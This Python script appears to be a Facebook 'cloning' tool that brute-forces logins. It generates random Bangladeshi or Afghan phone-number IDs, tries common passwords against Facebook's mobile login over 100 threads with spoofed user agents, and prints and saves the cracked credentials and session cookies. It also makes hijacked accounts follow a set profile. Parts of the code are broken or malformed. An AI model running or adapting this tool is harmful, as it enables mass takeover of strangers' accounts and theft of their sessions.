# Facebook: Bd RANBO. BY R4FSAN
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
ma4D1 = open
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🌺] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'
R4FSAN = print    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
os.system('xdg-open https://facebook.com/ma4D1')

logo ="""
\033[1;91m d8888b.  .d8b.  d88888b .d8888.  .d8b.  d8b   db 
\033[1;91m 88  `8D d8' `8b 88'     88'  YP d8' `8b 888o  88 
\033[1;91m 88oobY' 88ooo88 88ooo   `8bo.   88ooo88 88V8o 88 
\033[1;91m 88`8b   88~~~88 88~~~     `Y8b. 88~~~88 88 V8o88 
\033[1;91m 88 `88. 88   88 88      db   8D 88   88 88  V888 
\033[1;91m 88   YD YP   YP YP      `8888Y' YP   YP VP   V8P
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;92m➣ \033[1;92mDEVOLPER   :            RAFSAN AHAMMED RAFI
\033[1;91m➣ \033[1;91mFACEBOOK   :            MD. ARIF MIA
\033[1;92m➣ \033[1;92mWHATSAPP   :            016********
\033[1;91m➣ \033[1;91mGITHUB     :            R4FSAN
\033[1;92m➣ \033[1;92mTOOLS      :            BD RANDOM
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
"""
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    R4FSAN(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    R4FSAN('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
R4FSAN('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        R4FSAN('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents
ugen2=['Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/E7FBAF']
ugen=[]

 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def mahdi():
    os.system('clear')
    print(logo)
    os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
    print ('\033[1;93m[1] Bangladashi ID')
    print ('\033[1;91m[2] Afghanistan  ID')
    Mhasan = input('\033[1;0m\nINPUT===>')
    if Mhasan in['1']:
        os.system('xdg-open https://www.facebook.com/profile.php?id=100003174443045')
        mahdi_bd()
    if Mhasan in['2']:
        mahdi_afg()
    elif Mhasan:
        mahdi()    
# APK CHECK
def mahdi_bd():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    R4FSAN(logo)
    R4FSAN(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    R4FSAN(" ══════════════════════════════════════════")
    rk1 = '016'
    rk2 = '017'
    rk3 = '018'
    rk4 = '019'
    code = random.choice([rk1,rk2,rk3,rk4])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    R4FSAN(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    os.system("clear")
    Rafsan_Ahammed(logo)
    passx = 0
    HamiiID = []
    R4FSAN("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:],love,love[2:],love+code,'i love you','Fuck you','bangladesh']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")



def mahdi_afg():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    R4FSAN(logo)
    R4FSAN(f' [{xr}^{x}] Example>: {xr}019,017,018,016,015{x}')
    R4FSAN(" ══════════════════════════════════════════")
    rk1 = '9370'
    rk2 = '9379'
    rk3 = '9378'
    rk4 = '9377'
    rk5 = '9374'
    code = random.choice([rk1,rk2,rk3,rk4,rk5])                      # input(f' [{xr}■{x}] Choose : ')
    os.system('clear')
    R4FSAN(logo)
    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m═════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    os.system("clear")
    R4FSAN(logo)
    passx = 0
    HamiiID = []
    R4FSAN("")
    for bilal in range(passx):
        pww = input(f"[*] Enter Password {bilal+1} : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=100) as manshera:
        clear()
        tl = str(len(user))
        jalan('\033[1;97m====================================================')
        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:],love,love[2:],love+code,'afghan1234','afghan123','afghanistan','100200','500600','800900']
            uid = code+love
            for Shuvo in HamiiID:
                pwx.append(Shuvo)
                pwx.append(love)
            manshera.submit(rcrack,uid,pwx,tl)
    print(f"\n{x} ══════════════════════════════════════════")    
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
            'sec-ch-ua': '"Chromium";v="108", "Not=A?Brand";v="8"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[R4FSAN-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                ma4D1('/sdcard/R4FSAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[R4FSAN] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                ma4D1('/sdcard/R4FSAN-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}R4FSAN{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

R4FSAN()
